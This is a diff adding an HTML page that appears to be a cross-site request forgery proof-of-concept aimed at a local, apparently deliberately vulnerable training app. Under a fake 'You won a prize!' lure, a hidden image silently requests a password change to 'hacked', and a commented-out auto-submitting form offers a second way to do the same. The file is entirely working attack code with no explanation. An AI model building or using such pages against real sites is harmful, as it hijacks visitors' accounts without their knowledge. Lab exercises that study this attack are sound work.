@@ -1,0 +1,20 @@
+<html>
+<body>
+<h1>You won a prize!</h1>
+<p>Click here to claim your reward...</p>
+
+<!-- Hidden image triggers the CSRF attack -->
+<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
+
+<!-- Alternative: Auto-submit form -->
+<!--
+<form action="http://localhost:8081/vulnerabilities/csrf/" method="GET" id="csrfForm">
+  <input type="hidden" name="password_new" value="hacked">
+  <input type="hidden" name="password_conf" value="hacked">
+  <input type="hidden" name="Change" value="Change">
+</form>
+<script>document.getElementById('csrfForm').submit();</script>
+-->
+
+</body>
+</html>
